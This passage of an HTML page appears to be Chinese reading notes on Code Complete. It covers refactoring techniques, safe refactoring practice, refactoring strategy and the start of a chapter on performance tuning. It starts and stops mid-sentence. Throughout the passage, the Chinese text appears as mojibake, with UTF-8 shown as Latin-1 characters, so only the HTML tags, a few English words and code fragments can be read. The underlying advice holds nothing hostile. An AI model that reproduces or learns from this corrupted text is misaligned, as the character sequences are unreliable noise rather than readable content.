ã€‚</strong>â€</li><li>ä½¿ç”¨äº†å…¨å±€å˜é‡</li><li>ç¨‹åºä¸­çš„ä¸€äº›ä»£ç ä¼¼ä¹æ˜¯åœ¨å°†æ¥çš„æŸä¸ªæ—¶å€™æ‰ä¼šç”¨åˆ°ã€‚<strong>â€œè¶…å‰è®¾è®¡â€çš„ä»£ç æ˜¯ç”»è›‡æ·»è¶³</strong>ï¼Œå¢åŠ äº†ç¨‹åºçš„å¤æ‚æ€§ï¼Œå¸¦æ¥äº†é¢å¤–çš„æµ‹è¯•ã€ä¿®è¡¥ç¼ºé™·ç­‰å·¥ä½œé‡ã€‚å¯¹æœªæ¥éœ€æ±‚æœ‰æ‰€å‡†å¤‡çš„åŠæ³•å¹¶ä¸æ˜¯å»ç¼–å†™ç©ºä¸­æ¥¼é˜å¼çš„ä»£ç ï¼Œè€Œæ˜¯å°½å¯èƒ½æ»¡è¶³å½“å‰éœ€æ±‚çš„ä»£ç æ¸…æ™°ç›´ç™½åœ°è¡¨ç°å‡ºæ¥ï¼Œä½¿æœªæ¥çš„ç¨‹åºå‘˜ç†è§£è¿™äº›ä»£ç åˆ°åº•å®Œæˆäº†ä»€ä¹ˆåŠŸèƒ½ï¼Œæ²¡æœ‰å®Œæˆä»€ä¹ˆåŠŸèƒ½ï¼Œä»è€Œæ ¹æ®ä»–ä»¬çš„éœ€è¦è¿›è¡Œä¿®æ”¹ã€‚</li></ul><blockquote><p>å½“ä¸€æ®µä»£ç éœ€è¦ç”¨æ–‡æ¡£æ‰èƒ½æè¿°æ¸…æ¥šæ—¶ï¼Œè¦ä¹ˆæ˜¯ä½ æ²¡æœ‰ç†è§£ä½ æ‰€å†™çš„ä»£ç ï¼Œè¦ä¹ˆæ˜¯ä½ çš„å®ç°æ–¹å¼è¿‡äºå¤æ‚ï¼Œæ­¤æ—¶ä½ åº”è¯¥ä¼˜åŒ–ä»£ç ï¼Œè€Œä¸æ˜¯æ–°å¢æ–‡æ¡£ï¼Œæ–‡æ¡£åº”è¯¥ä»…ç”¨äºæè¿°å¤æ‚çš„ä¸šåŠ¡é€»è¾‘ï¼Œæˆ–è€…æ— æ³•ç®€åŒ–çš„ä»£ç ã€‚</p><p>æ–‡æ¡£çœ‹ä¼¼æ˜¯ä¸‡é‡‘æ²¹ï¼Œä½†æ–‡æ¡£ä¹Ÿä¼šæœ‰å„ç§å¼Šç«¯ï¼Œå¦‚ç»´æŠ¤æ€»æ˜¯æ»åã€æ¯ä¸ªäººçš„æ€ç»´æ–¹å¼ä¸åŒå¯¼è‡´é˜…è¯»è€…ä¸è¡¨è¾¾è€…æ— æ³•ä¿¡æ¯å¯¹ç­‰ã€èŠ±è´¹æ›´å¤šçš„æ—¶é—´ã€ç»´æŠ¤æ„æ„¿ä½ï¼Œéœ€è¦å¼ºåˆ¶æ‰§è¡Œç­‰ã€‚å½“æˆ‘ä»¬å‘ç°ä¸€ä»¶äº‹éœ€è¦ç”¨æ–‡æ¡£æ‰èƒ½æè¿°æ¸…æ¥šæ—¶ï¼Œéœ€è¦è€ƒè™‘ä¸€ä¸‹è¿™ä»¶äº‹æ˜¯ä¸æ˜¯åšå¤æ‚äº†ï¼Ÿä¸€ä¸ªéœ€è¦è¯»è¯´æ˜ä¹¦çš„æ¸¸æˆæ˜¯æ²¡æœ‰äººä¼šç©å„¿çš„ã€‚</p></blockquote><p>æ•°æ®çº§çš„é‡æ„</p><ul><li>ç”¨å…·åå¸¸é‡æ›¿ä»£ç¥ç§˜æ•°å€¼</li><li>ä½¿å˜é‡çš„åå­—æ›´ä¸ºæ¸…æ™°ä¸”ä¼ é€’æ›´å¤šä¿¡æ¯</li><li>æŠŠä¸€ä¸ªä¸­é—´å˜é‡æ¢æˆç»™å®ƒèµ‹å€¼çš„é‚£ä¸ªè¡¨è¾¾å¼æœ¬èº«</li><li>ç”¨å‡½æ•°æ¥æ›¿ä»£è¡¨è¾¾å¼</li><li>å¼•å…¥ä¸­é—´å˜é‡</li><li>æ›¿æ¢iã€jã€kç­‰åŒåå¤šç”¨é€”å˜é‡å</li><li>åœ¨å±€éƒ¨ç”¨é€”ä¸­ä½¿ç”¨å±€éƒ¨å˜é‡è€Œä¸æ˜¯å‚æ•°</li><li>å°†åŸºç¡€æ•°æ®ç±»å‹è½¬æ¢ä¸ºç±»ã€‚å¦‚æœä¸€ä¸ªåŸºç¡€æ•°æ®ç±»å‹éœ€è¦é¢å¤–çš„åŠŸèƒ½æˆ–é¢å¤–çš„æ•°æ®ï¼Œé‚£ä¹ˆå°±è¯¥æŠŠæ•°æ®è½¬æ¢ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åå†æ·»åŠ ä½ æ‰€éœ€è¦çš„ç±»è¡Œä¸ºã€‚</li><li><strong>å°†ä¸€ç»„ç±»å‹ç è½¬æ¢ä¸ºç±»æˆ–æšä¸¾ç±»å‹</strong>ã€‚å¦‚<code>const int SCREEN = 0;</code>ï¼Œä¸å…¶å®šä¹‰è¿™äº›å•ç‹¬çš„å¸¸é‡ï¼Œä¸å¦‚å®šä¹‰ä¸€ä¸ªç±»ï¼Œè¿™æ ·ä½ å°±å¯ä»¥äº«å—ä¸¥æ ¼ç±»å‹æ£€æŸ¥æ‰€å¸¦æ¥çš„å¥½å¤„ã€‚</li><li>å°†ä¸€ç»„ç±»å‹ç è½¬æ¢ä¸ºä¸€ä¸ªåŸºç±»åŠå…¶ç›¸åº”æ´¾ç”Ÿç±»ã€‚å¦‚æœä¸ä¸åŒç±»å‹ç›¸å…³è”çš„ä¸åŒä»£ç ç‰‡æ®µæœ‰ç€ä¸ä¸€æ ·çš„åŠŸèƒ½ï¼Œè¯·è€ƒè™‘ä¸ºè¯¥ç±»å‹åˆ›å»ºä¸€ä¸ªåŸºç±»ï¼Œç„¶åé’ˆå¯¹æ¯ä¸ªç±»å‹ç åˆ›å»ºæ´¾ç”Ÿç±»ã€‚å¦‚å¯¹ OutputType åŸºç±»ï¼Œå°±å¯ä»¥åˆ›å»º Screenã€Printer å’Œ File è¿™æ ·çš„æ´¾ç”Ÿç±»ã€‚</li><li>æŠŠæ•°ç»„è½¬æ¢ä¸ºå¯¹è±¡ã€‚å¦‚æœæ­£åœ¨ä½¿ç”¨ä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­çš„ä¸åŒå…ƒç´ å…·æœ‰ä¸åŒçš„ç±»å‹ï¼Œé‚£ä¹ˆå°±åº”è¯¥ç”¨ä¸€ä¸ªå¯¹è±¡æ¥æ›¿ä»£å®ƒã€‚å°†æ•°ç»„ä¸­çš„å„ä¸ªå…ƒç´ è½¬åŒ–ä¸ºè¯¥ç±»çš„å„ä¸ªæˆå‘˜ã€‚</li><li>æŠŠæ•°æ®é›†å°è£…èµ·æ¥ã€‚å¦‚æœä¸€ä¸ªç±»è¿”å›ä¸€ä¸ªæ•°æ®é›†ï¼Œåˆ°å¤„æ•£å¸ƒçš„å¤šä¸ªæ•°æ®é›†å®ä¾‹å°†ä¼šå¸¦æ¥åŒæ­¥é—®é¢˜ã€‚è¯·è®©ä½ çš„ç±»è¿”å›ä¸€ä¸ªåªè¯»æ•°æ®é›†ï¼Œå¹¶ä¸”æä¾›ç›¸åº”çš„ä¸ºæ•°æ®é›†æ·»åŠ å’Œåˆ é™¤å…ƒç´ çš„å­ç¨‹åºã€‚</li><li>ç”¨æ•°æ®ç±»æ¥ä»£æ›¿ä¼ ç»Ÿè®°å½•ã€‚å»ºç«‹ä¸€ä¸ªåŒ…å«è®°å½•æˆå‘˜çš„ç±»ã€‚è¿™æ ·ä½ å¯ä»¥é›†ä¸­å®Œæˆå¯¹è®°å½•çš„é”™è¯¯æ£€æŸ¥ã€æŒä¹…åŒ–å’Œå…¶ä»–ä¸è¯¥è®°å½•ç›¸å…³çš„æ“ä½œã€‚</li></ul><p>è¯­å¥çº§çš„é‡æ„</p><ul><li>åˆ†è§£å¸ƒå°”è¡¨è¾¾å¼ã€‚é€šè¿‡å¼•å…¥å‘½åå‡†ç¡®çš„ä¸­é—´å˜é‡æ¥ç®€åŒ–å¤æ‚çš„å¸ƒå°”è¡¨è¾¾å¼ï¼Œé€šè¿‡å˜é‡åæ›´å¥½åœ°è¯´æ˜è¡¨è¾¾å¼çš„å«ä¹‰ã€‚</li><li>å°†å¤æ‚å¸ƒå°”è¡¨è¾¾å¼è½¬æ¢æˆå‘½åå‡†ç¡®çš„å¸ƒå°”å‡½æ•°</li><li>åˆå¹¶æ¡ä»¶è¯­å¥ä¸åŒéƒ¨åˆ†ä¸­çš„é‡å¤ä»£ç ç‰‡æ®µ</li><li>ä½¿ç”¨ break æˆ– retum è€Œä¸æ˜¯å¾ªç¯æ§åˆ¶å˜é‡</li><li>åœ¨åµŒå¥—çš„ if-then-else è¯­å¥ä¸­ä¸€æ—¦çŸ¥é“ç­”æ¡ˆå°±ç«‹å³è¿”å›ï¼Œè€Œä¸æ˜¯å»èµ‹ä¸€ä¸ªè¿”å›å€¼ã€‚ä¸€æ—¦çŸ¥é“è¿”å›å€¼å°±è¿…é€Ÿé€€å‡ºå­ç¨‹åºï¼Œè¿™æ ·çš„ä»£ç æœ€å®¹æ˜“åˆ†æï¼Œä¹Ÿä¸å®¹æ˜“å‡ºé”™ã€‚å¦‚æœè®¾ç½®ä¸€ä¸ªè¿”å›å€¼ï¼Œå†é€šè¿‡å•°å—¦çš„é€»è¾‘åˆ¤æ–­é€€å‡ºå¾ªç¯ï¼Œä½ çš„ä»£ç å°±ä¼šéš¾äºç†è§£ã€‚</li><li>ç”¨å¤šæ€æ¥æ›¿ä»£æ¡ä»¶è¯­å¥(å°¤å…¶æ˜¯é‡å¤çš„caseè¯­å¥)ã€‚ç»“æ„åŒ–ç¨‹åºé‡Œå¾ˆå¤šçš„caseè¯­å¥ä¸­çš„é€»è¾‘éƒ½å¯ä»¥è¢«æ”¾åˆ°ç»§æ‰¿å…³ç³»ä¸­ï¼Œé€šè¿‡å¤šæ€å‡½æ•°è°ƒç”¨å®ç°ã€‚</li><li>åˆ›å»ºå’Œä½¿ç”¨nullå¯¹è±¡è€Œä¸æ˜¯å»æ£€æµ‹ç©ºå€¼ã€‚</li></ul><p>å­ç¨‹åºçº§é‡æ„</p><ul><li>æå–å­ç¨‹åºæˆ–è€…æ–¹æ³•</li><li>å¦‚æœå­ç¨‹åºçš„ç¨‹åºä½“å¾ˆç®€å•ï¼Œä¸”å«ä¹‰ä¸è¨€è‡ªæ˜ï¼Œé‚£ä¹ˆå°±åœ¨ä½¿ç”¨çš„æ—¶å€™ç›´æ¥ä½¿ç”¨è¿™äº›ä»£ç ã€‚</li><li>å°†å†—é•¿çš„å­ç¨‹åºè½¬æ¢ä¸ºç±»ã€‚</li><li>ç”¨ç®€å•ç®—æ³•æ›¿ä»£å¤æ‚ç®—æ³•ã€‚</li><li>å¦‚æœå­ç¨‹åºéœ€è¦ä»è°ƒç”¨æ–¹è·å¾—æ›´å¤šçš„ä¿¡æ¯ï¼Œå¯ä»¥å¢åŠ å®ƒçš„å‚æ•°ä»è€Œä¸ºå…¶æä¾›ä¿¡æ¯ã€‚</li><li>åˆ é™¤å†—ä½™å‚æ•°</li><li>å°†æŸ¥è¯¢æ“ä½œä»ä¿®æ”¹æ“ä½œä¸­ç‹¬ç«‹å‡ºæ¥ã€‚æŸ¥è¯¢æ“ä½œä¸åº”æ”¹å˜å¯¹è±¡çš„çŠ¶æ€ã€‚</li><li>åˆå¹¶ç›¸ä¼¼çš„å­ç¨‹åºï¼Œé€šè¿‡å‚æ•°åŒºåˆ†å®ƒä»¬çš„åŠŸèƒ½</li><li><strong>å°†è¡Œä¸ºå–å†³äºå‚æ•°çš„å­ç¨‹åºæ‹†åˆ†å¼€æ¥</strong>ã€‚å¦‚æœä¸€ä¸ªå­ç¨‹åºæ ¹æ®è¾“å…¥å‚æ•°çš„å€¼æ‰§è¡Œäº†ä¸åŒçš„ä»£ç ï¼Œè¯·è€ƒè™‘å°†å®ƒæ‹†åˆ†æˆå¯å‡ ä¸ªä»¥è¢«å•ç‹¬è°ƒç”¨çš„ã€æ— é¡»ä¼ é€’ç‰¹å®šå‚æ•°çš„å­ç¨‹åºã€‚</li><li>ä¼ é€’æ•´ä¸ªå¯¹è±¡è€Œéç‰¹å®šæˆå‘˜ã€‚å¦‚æœå‘ç°æœ‰åŒä¸€å¯¹è±¡çš„å¤šä¸ªå€¼è¢«ä¼ é€’ç»™äº†ä¸€ä¸ªå­ç¨‹åºï¼Œè€ƒè™‘æ˜¯å¦å¯ä¿®æ”¹å…¶æ¥å£ä½¿ä¹‹æ¥æ”¶æ•´ä¸ªå¯¹è±¡ã€‚</li><li>ä¼ é€’ç‰¹å®šæˆå‘˜è€Œéæ•´ä¸ªå¯¹è±¡ã€‚å¦‚æœå‘ç°åˆ›å»ºå¯¹è±¡çš„å”¯ä¸€ç†ç”±åªæ˜¯ä½ éœ€è¦å°†å®ƒä¼ å…¥æŸä¸ªå­ç¨‹åºï¼Œé‚£ä¹ˆå°±è€ƒè™‘ä¸€ä¸‹ æ˜¯å¦å¯ä»¥ä¿®æ”¹è¿™ä¸ªå­ç¨‹åºï¼Œä½¿ä¹‹æ¥æ”¶ç‰¹å®šæ•°æ®æˆå‘˜è€Œéæ•´ä¸ªå¯¹è±¡ã€‚</li><li>åŒ…è£…å‘ä¸‹è½¬å‹çš„æ“ä½œã€‚é€šå¸¸å½“å­ç¨‹åºè¿”å›ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œåº”å½“è¿”å›å…¶å·²çŸ¥çš„æœ€ç²¾ç¡®çš„å¯¹è±¡ç±»å‹ã€‚è¿™å°¤å…¶é€‚ç”¨äºè¿”å›è¿­ä»£å™¨ã€ç¾¤é›†ã€ç¾¤é›†å…ƒç´ ç­‰çš„æƒ…å†µã€‚</li></ul><p>ç±»æ¥å£çš„é‡æ„</p><ul><li>å°†æˆå‘˜å‡½æ•°æ”¾åˆ°å¦ä¸€ä¸ªç±»ä¸­</li><li>æ˜ç¡®ç±»çš„èŒè´£ï¼Œæ‹†åˆ†æ‰¿æ‹…å¤šä¸ªèŒè´£çš„å•ç±»</li><li>åˆ é™¤å†—ä½™çš„ç±»</li><li>å»é™¤å§”æ‰˜å…³ç³»ä¸ä¸­é—´äººã€‚A ==&gt; B ==&gt; Cï¼Œä¸‰è€…çš„è°ƒç”¨å…³ç³»é“¾æ˜¯å¦å¿…é¡»ï¼Ÿ</li><li>ç”¨å§”æ‰˜ä»£æ›¿ç»§æ‰¿ã€‚å¦‚æœæŸç±»éœ€è¦ç”¨åˆ°å¦ä¸€ä¸ªç±»ï¼Œä½†åˆæ‰“ç®—è·å–å¯¹è¯¥ç±»æ¥å£æ›´å¤šçš„æ§åˆ¶æƒï¼Œé‚£ä¹ˆå¯ä»¥è®©åŸºç±»æˆä¸ºåŸæ´¾ç”Ÿç±»çš„ä¸€ä¸ªæˆå‘˜ï¼Œå¹¶å…¬å¼€å®ƒçš„ä¸€ç»„æˆå‘˜å‡½æ•°ï¼Œä»¥å®Œæˆä¸€ç§å†…èšçš„æŠ½è±¡ã€‚ï¼ˆï¼Ÿï¼Ÿï¼Ÿï¼‰</li><li>ç”¨ç»§æ‰¿ä»£æ›¿å§”æ‰˜ã€‚å¦‚æœæŸä¸ªç±»å…¬å¼€äº†å§”æ‰˜ç±»ï¼ˆæˆå‘˜ç±»ï¼‰æ‰€æœ‰çš„æˆå‘˜å‡½æ•°ï¼Œé‚£ä¹ˆè¯¥ç±»åº”è¯¥ä»å§”æ‰˜ç±»ç»§æ‰¿è€Œæ¥ï¼Œè€Œä¸æ˜¯ä½¿ç”¨è¯¥ç±»ã€‚ï¼ˆï¼Ÿï¼Ÿï¼Ÿï¼‰</li><li>å¼•å…¥å¤–éƒ¨çš„æˆå‘˜å‡½æ•°ã€‚å½“ä½ è°ƒç”¨äº†ä¸€ä¸ªæ— æ³•ä¿®æ”¹çš„ç±»çš„é¢å¤–æˆå‘˜å‡½æ•°æ—¶ï¼Œå°±å¯ä»¥åœ¨è°ƒç”¨ç±»ä¸­åˆ›å»ºæ–°çš„æˆå‘˜å‡½æ•°æ–¹å¼æ¥æä¾›æ­¤åŠŸèƒ½</li><li>å¼•å…¥æ‰©å±•ç±»</li><li>å¯¹æš´éœ²åœ¨å¤–çš„æˆå‘˜å˜é‡è¿›è¡Œå°è£…</li><li>å¯¹äºä¸èƒ½ä¿®æ”¹çš„ç±»æˆå‘˜ï¼Œåˆ é™¤ç›¸å…³çš„ set() æˆå‘˜å‡½æ•°</li><li>éšè—é‚£äº›ä¸ä¼šåœ¨ç±»ä¹‹å¤–è¢«ç”¨åˆ°çš„æˆå‘˜å‡½æ•°</li><li>å°è£…ä¸é€‚ç”¨çš„æˆå‘˜å‡½æ•°</li><li>åˆå¹¶é‚£äº›å®ç°éå¸¸ç±»ä¼¼çš„åŸºç±»å’Œæ´¾ç”Ÿç±»</li></ul><h3 id="å®‰å…¨çš„é‡æ„"><a href="#å®‰å…¨çš„é‡æ„" class="headerlink" title="å®‰å…¨çš„é‡æ„"></a>å®‰å…¨çš„é‡æ„</h3><p>é‡æ„æ˜¯ä¸€ç§æ”¹å–„ä»£ç è´¨é‡çš„å¼ºæœ‰åŠ›çš„æŠ€æœ¯,å¦‚æœä½¿ç”¨ä¸å½“ï¼Œé‡æ„ç»™ä½ å¸¦æ¥çš„éº»çƒ¦ä¼šæ¯”å®ƒæ‰€å¸¦æ¥çš„å¥½å¤„è¿˜è¦å¤šã€‚</p><ul><li>ä¿å­˜åˆå§‹ä»£ç </li><li>é‡æ„çš„æ­¥ä¼è¯·å°ä¸€äº›</li><li>åŒä¸€æ—¶é—´åªåšä¸€é¡¹é‡æ„</li><li>æŠŠè¦åšçš„äº‹æƒ…åˆ—å‡ºæ¥</li><li>å¦‚æœåœ¨ä¸€æ¬¡é‡æ„ä¸­å‘ç°éœ€è¦å¦ä¸€æ¬¡çš„é‡æ„ï¼Œä½ æœ€å¥½å…ˆå°†æœªæ¥éœ€è¦é‡æ„çš„åœ°æ–¹åˆ—å‡ºæ¥</li><li>å¤šä½¿ç”¨æ£€æŸ¥ç‚¹</li><li>åˆ©ç”¨ç¼–è¯‘å™¨çš„è­¦å‘Šä¿¡æ¯</li><li>é‡æ–°æµ‹è¯•</li><li>å¢åŠ æµ‹è¯•ç”¨ä¾‹</li><li>æ£€æŸ¥å¯¹ä»£ç çš„ä¿®æ”¹ã€‚<strong>ç ”ç©¶è¡¨æ˜ï¼Œç›¸å¯¹äºå¤§è§„æ¨¡ä¿®æ”¹ï¼Œå°çš„æ”¹åŠ¨æ›´å®¹æ˜“å‡ºé”™</strong>ã€‚åŸå› å¾ˆç®€å•ï¼šç¨‹åºå‘˜ä»¬å¯¹äºå¾ˆå°çš„ä¿®æ”¹å¸¸å¸¸ä¸ä»¥ä¸ºç„¶ã€‚ä»–ä»¬ä¸ä¼šç”¨çº¸å’Œç¬”æ¥æ¨æ•²ç¨‹åºï¼Œä¹Ÿä¸ä¼šè®©å…¶ä»–äººæ¥æ£€æŸ¥ä»£ç ã€‚æœ‰æ—¶ç”šè‡³æ ¹æœ¬ä¸ä¼šè¿è¡Œè¿™äº›ä»£ç æ¥éªŒè¯ä¿®æ”¹å·¥ä½œçš„æ­£ç¡®æ€§ã€‚</li><li>æ ¹æ®é‡æ„é£é™©çº§åˆ«æ¥è°ƒæ•´é‡æ„æ–¹æ³•ã€‚å¯¹äºé‚£äº›æœ‰ä¸€å®šé£é™©çš„é‡æ„ï¼Œ<strong>è°¨æ…æ‰èƒ½é¿å…å‡ºé”™</strong>ã€‚åŠ¡å¿…ä¸€æ¬¡åªå¤„ç†ä¸€é¡¹é‡æ„ã€‚é™¤äº†å®Œæˆé€šå¸¸è¦åšçš„ç¼–è¯‘æ£€æŸ¥å’Œå•å…ƒæµ‹è¯•ä¹‹å¤–ï¼Œè¿˜åº”è¯¥è®©å…¶ä»–äººæ¥æ£€æŸ¥ä½ çš„é‡æ„å·¥ä½œï¼Œæˆ–æ˜¯é’ˆå¯¹é‡æ„é‡‡ç”¨ç»“å¯¹ç¼–ç¨‹ã€‚ </li></ul><h3 id="ä¸å®œé‡æ„çš„æƒ…å†µ"><a href="#ä¸å®œé‡æ„çš„æƒ…å†µ" class="headerlink" title="ä¸å®œé‡æ„çš„æƒ…å†µ"></a>ä¸å®œé‡æ„çš„æƒ…å†µ</h3><ul><li><strong>ä¸è¦æŠŠé‡æ„å½“åšå…ˆå†™åæ”¹çš„ä»£åè¯</strong>ã€‚é‡æ„çš„å«ä¹‰æ˜¯åœ¨ä¸å½±å“ç¨‹åºè¡Œä¸ºçš„å‰æä¸‹æ”¹è¿›å¯è¿è¡Œçš„ä»£ç ã€‚é‚£äº›ä¿®è¡¥ç ´çƒ‚ä»£ç çš„ç¨‹åºå‘˜ä»¬ä¸æ˜¯åœ¨é‡æ„ï¼Œè€Œæ˜¯åœ¨æ‹¼å‡‘ä»£ç ã€‚</li><li>é¿å…é‡æ„ä»£æ›¿é‡å†™ã€‚å¦‚æœå‘ç°è‡ªå·±å¤„äºå¤§è§„æ¨¡çš„é‡æ„ä¹‹ä¸­ï¼Œå°±åº”è¯¥é—®é—®è‡ªå·±æ˜¯å¦åº”è¯¥æŠŠè¿™éƒ¨åˆ†ä»£ç æ¨å€’é‡æ¥ï¼Œé‡æ–°è®¾è®¡ï¼Œé‡æ–°å¼€å‘ã€‚</li></ul><h3 id="é‡æ„ç­–ç•¥"><a href="#é‡æ„ç­–ç•¥" class="headerlink" title="é‡æ„ç­–ç•¥"></a>é‡æ„ç­–ç•¥</h3><p>å¯¹ä»»ä½•ç‰¹å®šç¨‹åºéƒ½èƒ½å¸¦æ¥å¥½å¤„çš„é‡æ„æ–¹æ³•æœ¬åº”æ˜¯æ— ç©·æ— å°½çš„ã€‚å’Œå…¶ä»–çš„ç¼–ç¨‹è¡Œä¸ºä¸€æ ·ï¼Œé‡æ„åŒæ ·å—åˆ¶äºæ”¶ç›Šé€’å‡å®šå¾‹ï¼ŒåŒæ ·ä¹Ÿç¬¦åˆäºŒå…«æ³•åˆ™ã€‚</p><ul><li>åœ¨å¢åŠ å­ç¨‹åºæ—¶è¿›è¡Œé‡æ„ã€‚æ£€æŸ¥ç›¸å…³çš„å­ç¨‹åºæ˜¯å¦éƒ½è¢«åˆç†åœ°ç»„ç»‡èµ·æ¥äº†ã€‚</li><li>åœ¨æ·»åŠ ç±»çš„æ—¶å€™è¿›è¡Œé‡æ„ã€‚</li><li>åœ¨ä¿®è¡¥ç¼ºé™·çš„æ—¶å€™è¿›è¡Œé‡æ„</li><li>å…³æ³¨æ˜“äºå‡ºé”™çš„æ¨¡å—ã€‚çƒ«æ‰‹çš„å±±èŠ‹å½»åº•è§£å†³æ‰æ˜¯æœ‰æ•ˆçš„é‡æ„ç­–ç•¥ã€‚</li><li>å…³æ³¨é«˜åº¦å¤æ‚çš„æ¨¡å—</li><li><strong>åœ¨ç»´æŠ¤ä»£ç æ—¶ï¼Œç¡®ä¿ä»£ç åœ¨ç¦»å¼€ä½ çš„æ—¶å€™æ¯”æ¥ä¹‹å‰æ›´å¥åº·</strong></li><li>å®šä¹‰æ¸…æ¥šå¹²å‡€ä»£ç å’Œæ‹™åŠ£ä»£ç ä¹‹é—´çš„è¾¹ç•Œï¼Œç„¶åå°è¯•æŠŠä»£ç ç§»è¿‡è¿™æ¡è¾¹ç•Œ</li></ul><p>Key Points</p><ul><li>ä¿®æ”¹æ˜¯ç¨‹åºä¸€ç”Ÿéƒ½è¦é¢å¯¹çš„äº‹æƒ…ï¼Œä¸ä»…åŒ…æ‹¬æœ€åˆçš„å¼€å‘é˜¶æ®µï¼Œè¿˜åŒ…æ‹¬é¦–æ¬¡å‘å¸ƒä¹‹åã€‚</li><li>åœ¨ä¿®æ”¹ä¸­è½¯ä»¶çš„è´¨é‡è¦ä¹ˆæ”¹è¿›ï¼Œè¦ä¹ˆæ¶åŒ–ã€‚è½¯ä»¶æ¼”åŒ–çš„é¦–è¦æ³•åˆ™å°±æ˜¯ä»£ç æ¼”åŒ–åº”å½“æå‡ç¨‹åºçš„å†…åœ¨è´¨é‡ã€‚</li><li>é‡æ„æˆåŠŸä¹‹å…³é”®åœ¨äºç¨‹åºå‘˜åº”å­¦ä¼šå…³æ³¨é‚£äº›æ ‡å¿—ç€ä»£ç éœ€è¦é‡æ„çš„ä¼—å¤šçš„è­¦å‘Šæˆ–â€œä»£ç è‡­å‘³â€ã€‚</li><li><strong>å¼€å‘é˜¶æ®µçš„é‡æ„æ˜¯æå‡ç¨‹åºè´¨é‡çš„æœ€ä½³æ—¶æœº</strong>ï¼Œå› ä¸ºä½ å¯ä»¥ç«‹åˆ»è®©åˆšåˆšäº§ç”Ÿçš„æ”¹å˜æ¢¦æƒ³å˜æˆç°å®ã€‚è¯·çæƒœè¿™äº›å¼€å‘é˜¶æ®µçš„å¤©èµè‰¯æœºï¼</li></ul><h2 id="ç¬¬25ç« -ä»£ç -æ€§èƒ½-è°ƒæ•´ç­–ç•¥"><a href="#ç¬¬25ç« -ä»£ç -æ€§èƒ½-è°ƒæ•´ç­–ç•¥" class="headerlink" title="ç¬¬25ç«  ä»£ç (æ€§èƒ½)è°ƒæ•´ç­–ç•¥"></a>ç¬¬25ç«  ä»£ç (æ€§èƒ½)è°ƒæ•´ç­–ç•¥</h2><p>åœ¨æå°‘æƒ…å†µä¸‹ï¼Œç¨‹åºå‘˜èƒ½æ­£ç¡®ç¡®å®šå‡ºç¨‹åºçš„ç“¶é¢ˆã€‚ä½†ä»–ä»¬å¯èƒ½å¯¹è¿™ä¸€éƒ¨åˆ†ä»£ç ç—›ä¸‹é‡æ‰‹è€Œé¡¾æ­¤å¤±å½¼ï¼Œè®©å¦ä¸€éƒ¨åˆ†ä»£ç æˆä¸ºåˆ¶çº¦æ€§èƒ½çš„å…³é”®å› ç´ ã€‚è¿™æ ·ï¼Œæœ€ç»ˆçš„ç»“æœæ˜¯æ€§èƒ½çš„ä¸‹é™ã€‚è€Œå¦‚æœä¼˜åŒ–æ”¾åœ¨æ•´ä¸ªç³»ç»Ÿå®Œæˆä¹‹åï¼Œé‚£ä¹ˆç¨‹åºå‘˜å°±å¯ä»¥æ˜ç¡®å„ä¸ªé—®é¢˜åŸŸä»¥åŠå„è‡ªçš„ç›¸å¯¹é‡è¦æ€§,ä»è€Œæœ‰æ•ˆåœ°å¯¹å…¨éƒ¨ä¼˜åŒ–æ‰€ç”¨æ—¶é—´è¿›è¡Œåˆ†é…ã€‚ï¼ˆ<strong>æ€§èƒ½è°ƒæ•´æ”¾åœ¨ç³»ç»Ÿå®Œæˆåå¤„ç†</strong>ï¼‰</p><p>åœ¨æœ€åˆçš„å¼€å‘é˜¶æ®µä¸­ï¼Œç¨‹åºå‘˜è€æ˜¯æŠŠç›®å…‰é›†ä¸­åœ¨ä¼˜åŒ–ä¸Šé¢ä¼šå¹²æ‰°è‡ªå·±å¯¹å…¶ä»–ç¨‹åºç›®æ ‡çš„ç†è§£å’Œåˆ¤æ–­,è®©è‡ªå·±æ²‰æµ¸åœ¨é‚£äº›æœ€ç»ˆå¹¶æ²¡æœ‰ä¸ºç”¨æˆ·æä¾›å¤šå¤§ä»·å€¼çš„ç®—æ³•åˆ†æå’Œæ™¦æ¶©çš„è®¨è®ºä¸­ï¼ŒæŠŠå¯¹æ­£ç¡®æ€§ã€ä¿¡æ¯éšè—ã€å¯è¯»æ€§ç­‰çš„è€ƒè™‘æ”¾åˆ°äº†ç¬¬äºŒä½ã€‚å®é™…ä¸Šï¼Œåœ¨é‡è§†è¿™äº›ä¹‹åä¼šæ›´å®¹æ˜“å®æ–½æ€§èƒ½ä¼˜åŒ–ã€‚å¦‚æœé¦–å…ˆè€ƒè™‘å‰è€…ï¼Œé‚£ä¹ˆåæœŸä¼˜åŒ–å·¥ä½œé€šå¸¸åªä¼šå½±å“åˆ°ä¸è¶³5%çš„ç¨‹åºä»£ç ã€‚ä½ æ˜¯æ„¿æ„å›è¿‡å¤´å»å¤„ç†5%ä»£ç çš„æ•ˆèƒ½ï¼Œè¿˜æ˜¯å»æ”¹å–„100%çš„ç¨‹åºçš„å¯è¯»æ€§?</p><p>è¿‡æ—©çš„æ€§èƒ½ä¼˜åŒ–ä¼šå¯¹è½¯ä»¶çš„æ•´ä½“è´¨é‡äº§ç”Ÿä¸¥é‡å¨èƒï¼Œå—åˆ°å½±å“çš„ç”šè‡³åŒ…æ‹¬è½¯ä»¶çš„æ€§èƒ½ã€‚</p><p><strong>4%çš„ä»£ç é€ æˆäº†50%ç”šè‡³æ›´å¤šçš„æ€§èƒ½ç“¶é¢ˆã€‚</strong></p><p>å¸¸è§çš„æ•ˆç‡ä½ä¸‹ä¹‹æºï¼š</p><ul><li>I/Oã€‚å°½å¯èƒ½åœ¨å†…å­˜ä¸­æ“ä½œæ•°æ®ï¼Œé¿å…ç£ç›˜ä¸ç½‘ç»œ I/O 